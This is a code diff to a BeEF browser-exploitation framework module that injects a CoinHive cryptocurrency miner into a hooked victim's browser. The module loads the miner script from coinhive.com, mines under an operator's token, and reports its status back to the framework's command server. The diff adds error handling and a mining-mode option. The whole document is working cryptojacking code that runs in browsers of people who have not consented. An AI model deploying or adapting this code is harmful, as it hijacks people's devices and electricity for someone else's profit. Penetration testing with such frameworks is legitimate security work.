@@ -4,6 +4,8 @@
 // See the file 'doc/COPYING' for copying permission
 //
 beef.execute(function() {
+  var comm_url = '<%= @command_url %>';
+  var comm_id = <%= @command_id %>;
 
   load_script = function(url) {
     var s = document.createElement('script');
@@ -14,24 +16,42 @@ beef.execute(function() {
 
   beef.debug("[CoinHive] Loading library...");
   load_script('https://coinhive.com/lib/coinhive.min.js');
-  setTimeout("mine('<%= @public_token %>')", 10000);
 
-  mine = function(token) {
+  try {
+    setTimeout("mine('<%= @public_token %>', CoinHive.<%= @mode %>)", 10000);
+  } catch(e) {
+    beef.debug("[CoinHive] Error loading miner: " + e.message);
+    beef.net.send(comm_url, comm_id, 'error=' + e.message, beef.are.status_error());
+    return;
+  }
+
+  mine = function(token, mode) {
     beef.debug("[CoinHive] Starting the miner...");
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=Starting the miner');
+    beef.net.send(comm_url, comm_id, 'result=Starting the miner');
 
-    var miner = new CoinHive.Anonymous(token);
-    miner.start(); //CoinHive.FORCE_MULTI_TAB);
+    try {
+      var miner = new CoinHive.Anonymous(token);
+      miner.start(mode);
+    } catch(e) {
+      beef.debug("[CoinHive] Error starting miner: " + e.message);
+      beef.net.send(comm_url, comm_id, 'error=' + e.message, beef.are.status_error());
+      return;
+    }
 
+    miner.on('open', function() {
+      beef.debug("[CoinHive] Opened connection to pool successfully");
+      beef.net.send(comm_url, comm_id, 'result=Opened connection to pool successfully', beef.are.status_success());
+    })
     miner.on('authed', function() {
       beef.debug("[CoinHive] Authenticated successfully");
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=Authenticated successfully', beef.are.status_success());
+      beef.net.send(comm_url, comm_id, 'result=Authenticated successfully', beef.are.status_success());
     })
     miner.on('error', function(params) {
       beef.debug("[CoinHive] The pool reported an error: " + params.error);
       if (params.error === 'invalid_site_key') {
         miner.stop();
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + params.error, beef.are.status_error());
+        beef.net.send(comm_url, comm_id, 'error=' + params.error, beef.are.status_error());
+        return;
       }
     })
     miner.on('found', function() {
@@ -48,6 +68,6 @@ beef.execute(function() {
         var acceptedHashes = miner.getAcceptedHashes();
         beef.debug("[CoinHive] Total Hashes: " + totalHashes + " -- Accepted Hashes: " + acceptedHashes + " -- Hashes/Second: " + hashesPerSecond);
       }
-    }, 1000)
+    }, 60000)
   }
 });
